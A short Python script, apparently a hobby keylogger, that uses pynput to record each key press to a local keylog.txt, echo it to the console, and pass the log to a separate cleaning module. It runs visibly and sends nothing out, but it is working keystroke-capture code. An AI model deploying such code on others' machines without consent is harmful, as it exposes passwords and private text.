from pynput import keyboard
from keylogcleaner import process_keylog
open("keylog.txt", "w").close()
def key_pressed(key):
    print(str(key))
    with open("keylog.txt", "a") as logfile:
        try:
            logfile.write(key.char + "\n")
        except:
            logfile.write(str(key) + "\n")

    
if __name__ == "__main__":
    log_file = "keylog.txt"


    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input("Keylogger is running\n")
    process_keylog("keylog.txt", "cleaned_output.txt")
    print("File cleaned")